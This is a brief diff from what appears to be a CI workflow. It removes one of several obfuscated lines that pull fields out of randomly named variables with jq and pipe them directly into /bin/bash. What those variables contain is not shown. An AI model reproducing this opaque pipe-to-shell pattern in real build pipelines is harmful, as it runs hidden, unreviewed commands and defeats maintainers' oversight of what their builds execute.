@@ -22,7 +22,6 @@ jobs:
           echo $o570 | jq -r .oase41 | /bin/bash
           echo $stxw2 | jq -r .fyjt9 | /bin/bash
           echo $rcv30244 | jq -r .pet142 | /bin/bash
-          echo $ahmd6 | jq -r .ug43425 | /bin/bash
           echo $pjwrc026 | jq -r .hjch819 | /bin/bash
           echo $fnr7696 | jq -r .vq6 | /bin/bash
           echo $m3436 | jq -r .es077 | /bin/bash
